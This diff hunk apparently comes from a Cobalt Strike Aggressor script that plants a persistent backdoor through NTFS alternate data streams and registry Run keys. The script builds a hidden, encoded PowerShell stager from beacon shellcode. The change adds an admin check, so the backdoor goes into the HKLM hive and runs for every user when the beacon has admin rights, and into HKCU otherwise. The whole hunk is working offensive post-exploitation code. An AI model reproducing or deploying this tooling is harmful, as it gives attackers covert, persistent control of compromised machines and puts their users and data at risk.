@@ -20,8 +20,17 @@ sub createADSBackdoor {
 		$psPayload = powershell_encode_stager(shellcode($selectedListener));
 		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
 		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
-		binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload");
-		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+		# $bid is actually an array, so use $bid[0] for -isadmin
+		# Admitettly hacky way to avoid using lambda
+		if (-isadmin $bid[0]){
+			blog($bid, "Beacon is admin, using HKLM hive, \Ubackdoor will execute for any user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+		} else {
+			blog($bid, "Beacon is not admin, using HKCU hive, \Ubackdoor will only execute for this user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+		}
 	});
 }
 
